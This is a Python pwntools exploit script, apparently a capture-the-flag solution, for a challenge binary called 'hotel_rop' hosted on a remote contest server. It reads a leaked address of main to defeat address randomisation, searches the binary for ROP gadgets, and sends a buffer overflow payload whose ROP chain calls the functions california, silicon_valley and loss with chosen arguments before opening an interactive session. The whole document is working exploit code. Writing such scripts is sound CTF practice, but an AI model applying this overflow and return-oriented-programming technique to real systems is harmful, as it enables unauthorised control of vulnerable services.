#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./hotel_rop')

if args.REMOTE:
	p = remote('dctf1-chall-hotel-rop.westeurope.azurecontainer.io', 7480)
else:
	p = process(binary.path)

p.recvuntil('on main street ')
main = int(p.recvline().strip(),16)
log.info('main: ' + hex(main))
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += 0x28 * b'A'
payload += p64(binary.sym.california)
payload += p64(binary.sym.silicon_valley)
payload += p64(pop_rdi)
payload += p64(0x1337c0de)
payload += p64(pop_rsi_r15)
payload += p64(0xdeadc0de - 0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.loss)

p.sendlineafter('?\n',payload)
p.interactive()

